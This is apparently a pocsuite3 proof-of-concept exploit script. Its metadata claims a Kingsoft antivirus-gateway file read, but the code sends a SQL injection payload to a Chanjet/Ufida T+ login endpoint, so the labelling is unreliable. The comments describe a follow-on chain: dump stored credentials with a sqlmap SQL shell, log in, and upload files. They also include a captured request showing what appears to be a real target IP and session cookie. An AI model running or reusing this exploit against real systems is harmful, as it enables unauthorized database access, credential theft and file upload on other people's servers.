from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class DemoPOC(POCBase):
    vulID = '1234'
    name = '金山防毒墙任意文件读取'
    desc = '''金山防毒墙任意文件读取'''
    appPowerLink = '金山防毒墙任意文件读取'
    appName = '金山防毒墙任意文件读取'
    appVersion = '*'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):
        result = {}
        target = self.url + "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
        data='''
{
"AccountNum":"1'",
"UserName":"admin",
"Password":"e10adc3949ba59abbe56e057f20f883e",
"rdpYear":"2022",
"rdpMonth":"2",
"rdpDate":"21",
"webServiceProcessID":"admin",
"ali_csessionid":"",
"ali_sig":"",
"ali_token":"",
"ali_scene":"",
"role":"",
"aqdKey":"",
"formWhere":"browser",
"cardNo":""
}'''
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }

        try:
            r = requests.post(url=target, timeout=3, data=data, verify=False,headers=headers)
            if "Ufida.T.EAP.ErrorInfo.DatabaseException" in r.text and "order by cAcc_Num" in r.text and  r.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target+data
                #先执行个--sql-shell 然后直接用语句查询 select * from eap_configpath发现账号密码登录之后
                # POST / tplus / CommonPage / UserFileUpload.aspx
                # HTTP / 1.1
                # Accept: text / html, application / xhtml + xml, application / xml;
                # q = 0.9, image / avif, imag
                # e / webp, image / apng, * / *;q = 0.8, application / signed - exchange;
                # v = b3;
                # q = 0.9
                # Accept - Encoding: gzip, deflate
                # Accept - Language: zh - CN, zh;
                # q = 0.9, ru;
                # q = 0.8
                # Cache - Control: no - cache
                # Connection: keep - alive
                # Content - Length: 775
                # Content - Type: multipart / form - data;
                # boundary = ----WebKitFormBoundaryMXNLGZirKX5
                # UAvYG
                # Cookie: LOGIN_LANG = cn;
                # ASP.NET_SessionId = oafhmiapxpe5vqesdwm4oms5;
                # Hm_lvt_fd4
                # ca40261bc424e2d120b806d985a14 = 1674191380, 1674378083, 1674393050, 1674536169;
                # Hm
                # _lpvt_fd4ca40261bc424e2d120b806d985a14 = 1674543095
                # Host: 121.40
                # .160
                # .239
                # Origin: http: // 121.40
                # .160
                # .239
                # Pragma: no - cache
                # Referer: http: // 121.40
                # .160
                # .239 / tplus / CommonPage / UserFileUpload.aspx
                # Upgrade - Insecure - Requests: 1
                # User - Agent: Mozilla / 5.0(Windows
                # NT
                # 10.0;
                # Win64;
                # x64) AppleWebKit / 537.36(KHT
                # ML, like
                # Gecko) Chrome / 109.0
                # .0
                # .0
                # Safari / 537.36
                # ----WebKitFormBoundaryMXNLGZirKX5UAvYG
                # Content - Disposition: form - data;
                # name = "file";
                # filename = "Deep.txt"
                # Content - Type: image / jpeg
                # Hello
                # Hack
                # ----WebKitFormBoundaryMXNLGZirKX5UAvYG -
                #上传路径 tplus/UserFiles/文件名
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)